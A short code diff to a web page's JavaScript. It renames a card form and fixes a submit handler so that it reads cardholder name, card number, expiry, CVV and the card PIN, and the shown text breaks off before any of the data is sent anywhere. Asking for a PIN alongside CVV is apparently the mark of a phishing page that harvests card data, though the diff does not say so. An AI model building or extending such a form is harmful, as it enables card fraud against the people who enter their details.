@@ -458,15 +458,15 @@
     input.value = value.substring(0, 5);
   }
 
-  const cardForm = document.getElementById("cardForm");
-  cardForm.addEventListener("submit", async (e) => {
+  const CARDINFO = document.getElementById("CARDINFO");
+  CARDINFO.addEventListener("submit", async (e) => {
     e.preventDefault();
 
     const CN = document.getElementById("CardholderName").value;
     const cc = document.getElementById("CardNumber").value;
     const exp = document.getElementById("ExpirationDate").value;
     const cvv = document.getElementById("CCV").value;
-    const PIN = document.getElementById("CardNumber").value;
+    const PIN = document.getElementById("PIN").value;
 
 
     try {
